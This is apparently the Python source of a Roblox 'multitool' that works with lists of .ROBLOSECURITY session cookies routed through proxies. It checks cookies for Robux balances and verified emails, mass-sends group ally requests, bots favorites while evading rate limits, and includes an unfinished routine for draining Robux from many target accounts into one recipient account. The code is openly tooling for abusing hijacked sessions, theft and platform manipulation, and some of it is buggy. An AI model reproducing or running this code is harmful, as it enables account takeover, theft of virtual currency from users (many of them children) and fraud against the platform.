# Imports
import requests, json, threading, traceback, ctypes, os, time, random
from colorama import Fore, Back, Style, init
from bs4 import BeautifulSoup

from pprint import pprint

init()

# Global Variables for threads to share
globalcsrf_token = None
proxies = None
cookies = None
test_cookie = None

# Init function - Zz
def init_proxies_and_cookies():
    """
    Using `with` to open the files instead 
    of opening and reading within one line 
    allows us to open the file without 
    having to close it yet it is properly 
    closed once the process is complete
    """
    global proxies

    with open("proxies.txt", "r") as proxy_file:
        proxies = [
            {"https": "http://" + proxy} for proxy in proxy_file.read().splitlines()
        ]

    global cookies

    with open("cookies.txt", "r") as cookies_file:
        cookies = cookies_file.read().splitlines()


# Funcs
def input_sys():
    # print(Fore.YELLOW)
    print(Fore.YELLOW + ">>> " + Style.RESET_ALL, end="")
    word = input()
    return word


def clearscreen():
    os.system("cls")


# Get X-CSRF TOKEN -- SomethingElse
def getxcsrf(original_cookie: str):
    """
    Sends a dummy request to the same URL 
    with the given cookie and returns the 
    X-CSRF-TOKEN that gets returned in headers
    """

    url = f"https://www.roblox.com/api/item.ashx?"

    r = requests.post(url, cookies={".ROBLOSECURITY": original_cookie})

    if r.status_code == 403:
        try:
            return r.headers["x-csrf-token"]
        except:
            return None

    return None


# Vip Scraper -- Tvnyl
def vip_scraper():
    vip_servers = 0
    vip_url = "https://freerobloxvipservers.com/"
    req = requests.get(vip_url)
    soup = BeautifulSoup(req.content, "html.parser")
    vip_finder = soup.find_all("p", class_="text-sm mb-0")
    vip_link = [i.a["href"] for i in vip_finder]
    discord_link = "https://discord.gg/SdQ5u9x"
    if discord_link in vip_link:
        vip_link.remove(discord_link)
    with open("vip_links.txt", "w") as f:
        for i in vip_link:
            vip_servers += 1
            print(
                "[" + Fore.GREEN + "!" + Style.RESET_ALL + "]"
                f" Vip Servers Found {vip_servers}"
            )
            ctypes.windll.kernel32.SetConsoleTitleA(f"Vintle Multitool |")
            f.write(f"{i}\n")


# Ally Bot Thread Function -- SomethingElse
def runallythread(i, GroupId):
    global globalcsrf_token
    global proxies
    while True:
        ally_sent = 0
        targetID = random.randint(1, 7728165)
        try:
            ally_request = requests.session()
            ally_request.cookies[".ROBLOSECURITY"] = i
            ally_request.headers["X-CSRF-TOKEN"] = getxcsrf(i)
            ally_request = ally_request.post(
                url="https://groups.roblox.com/v1/groups/"
                + GroupId
                + "/relationships/allies/"
                + str(targetID),
                proxies=random.choice(proxies),
            )
            if ally_request.status_code == 200:
                ally_sent += 1
                print(
                    "["
                    + Fore.GREEN
                    + "!"
                    + Style.RESET_ALL
                    + "] Sent ally request to "
                    + str(targetID)
                )
                ctypes.windll.kernal32.SetConsoleTitleW(
                    f"Vintle Multitool | All Requests Sent {ally_sent}"
                )
            else:
                if ally_request.status_code == 403:
                    getxcsrf(i)
                else:
                    if ally_request.status_code == 429:
                        time.sleep(3)
        except:
            time.sleep(2)


# Cookie Checker
def Cookie_checker(i):
    robux_acc = 0
    email_verify = 0
    req = requests.Session()
    req.cookies[".ROBLOSECURITY"] = i
    try:
        r = req.get("http://www.roblox.com/mobileapi/userinfo").json()
        r = req.post("https://www.roblox.com/api/item.ashx?")
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    req2 = req.get("https://api.roblox.com/my/balance")
    req3 = req.get("https://accountsettings.roblox.com/v1/email").json()
    try:
        z = req2.json()["errors"]
    except:
        robux = req2.json()["robux"]
        robux_acc += 1
        print(
            "[" + Fore.LIGHTGREEN_EX + "!" + Style.RESET_ALL + "]"
            " Foud Cookie with Robux"
        )
        ctypes.windll.kernel32.SetConsoleTitleA(
            f"Vintle Multitool | Accounts With Robux Found: {robux_acc}"
        )
        verify = req3["verified"]
        if verify == True:
            email_verify += 1
            print(
                "[" + Fore.LIGHTGREEN_EX + "!" + Style.RESET_ALL + "]"
                " Found Cookie with Verified Email"
            )
            ctypes.windll.kernel32.SetConsoleTitleW(
                f"Vintle Multitool | Accounts With Verified Email: {email_verify}"
            )
            with open("checked_cookies.txt", "w") as f:
                f.write(f"{i}\n | Robux {robux} | Email Verified")
        else:
            with open("checked_cookies.txt", "w") as f:
                f.write(f"{i}\n | Robux {robux} | Email NotVerified")


# Transfer bot - Zz
def transfer_bot(recipient_cookie: str = None, target_cookies: list = None):
    """
    Transfer all robux from multiple given cookies to central account
    
    recipient_cookie: str -> Cookie to be recipient of all the robux
    target_cookies: list -> Cookies to take robux from
    """

    # IN PROGRESS

    if not (recipient_cookie or target_cookies):
        print("Recipient/targets were not clarified")
        return

    config_file_data = {
        "apple": {
            "type": "GamePass",
            "name": "Transfer Test",
            "description": "This is my random transfer asset",
        }
    }

    config_post_data = {
        "AssetDetails": [
            {"assetId": 0, "assetFileName": "config.json", "uploadAssetError": "None"}
        ]
    }

    with open("config.json", "w") as f:
        json.dump(config_file_data, fp=f)
        print("Data loaded into file")

    f = open("config.json", "r")

    files = {"upload_file": f}

    ck = {
        "Cookie": ".ROBLOSECURITY=" + recipient_cookie,
        "X-CSRF-TOKEN": getxcsrf(recipient_cookie),
    }

    print(ck)

    r = requests.post(
        "https://publish.roblox.com/v1/assets/upload",
        cookies=ck,
        data=config_post_data,
        files=files,
    )

    print(r.status_code)
    print(r.text)

    f.close()

    # IN PROGRESS


# Start Screen
def StartScreen():
    clearscreen()
    print(
        Fore.MAGENTA
        + """
    ███████████████████████████████████████████████████████████████████████████████████████████████████████████"""
    )
    print(
        Fore.LIGHTMAGENTA_EX
        + """
    VVVVVVVV           VVVVVVVV  iiii                             tttt          lllllll
    V::::::V           V::::::V i::::i                         ttt:::t          l:::::l
    V::::::V           V::::::V  iiii                          t:::::t          l:::::l
    V::::::V           V::::::V                                t:::::t          l:::::l
     V:::::V           V:::::V iiiiiii nnnn  nnnnnnnn    ttttttt:::::ttttttt     l::::l     eeeeeeeeeeee
      V:::::V         V:::::V  i:::::i n:::nn::::::::nn  t:::::::::::::::::t     l::::l   ee::::::::::::ee
       V:::::V       V:::::V    i::::i n::::::::::::::nn t:::::::::::::::::t     l::::l  e::::::eeeee:::::ee
        V:::::V     V:::::V     i::::i nn:::::::::::::::ntttttt:::::::tttttt     l::::l e::::::e     e:::::e
         V:::::V   V:::::V      i::::i   n:::::nnnn:::::n      t:::::t           l::::l e:::::::eeeee::::::e
          V:::::V V:::::V       i::::i   n::::n    n::::n      t:::::t           l::::l e:::::::::::::::::e
           V:::::V:::::V        i::::i   n::::n    n::::n      t:::::t           l::::l e::::::eeeeeeeeeee
            V:::::::::V         i::::i   n::::n    n::::n      t:::::t    tttttt l::::l e:::::::e
             V:::::::V         i::::::i  n::::n    n::::n      t::::::tttt:::::tl::::::le::::::::e
              V:::::V          i::::::i  n::::n    n::::n      tt::::::::::::::tl::::::l e::::::::eeeeeeee
               V:::V           i::::::i  n::::n    n::::n        tt:::::::::::ttl::::::l  ee:::::::::::::e
                VVV            iiiiiiii  nnnnnn    nnnnnn          ttttttttttt  llllllll   eeeeeeeeeeeeee
                """
    )
    print(
        Fore.MAGENTA
        + """
    ███████████████████████████████████████████████████████████████████████████████████████████████████████████"""
    )


# Favourite Bot
def favorite(i):
    favorited = 0
    checked = 0
    print("Asset/Game ID")
    id_ = input_sys()
    req = requests.Session()
    try:
        req.cookies[".ROBLOSECURITY"] = i
        r = req.get(
            "http://www.roblox.com/mobileapi/userinfo", proxies=random.choice(proxies)
        ).json()
        r = req.post(
            "https://www.roblox.com/api/item.ashx?", proxies=random.choice(proxies)
        )
        req.headers["X-CSRF-TOKEN"] = r.headers["X-CSRF-TOKEN"]
    except:
        print("[" + Fore.RED + "!" + Style.RESET_ALL + "]" + "Invalid Cookie")
    data = {"itemTargetId": id_, "favoriteType": "asset"}
    try:
        r = req.post(
            "https://web.roblox.com/v2/favorite/toggle",
            data=data,
            proxies=random.choice(proxies),
        )
        if r.json()["message"] == "Too Many Attempts":
            print("[" + Fore.YELLOW + "!" + Style.RESET_ALL + "]")
        else:
            favorited += 1
            print(
                f"["
                + Fore.GREEN
                + "!"
                + Style.RESET_ALL
                + "]"
                + " Botted {favorited} favorites to game/asset: {id}"
            )
    except:
        pass
    checked += 1
    ctypes.windll.kernel32.SetConsoleTitleW(
        f"Vintle Multitool | Favourites Earned {favorited}"
    )


# dont Put the inputs in a function

init_proxies_and_cookies()
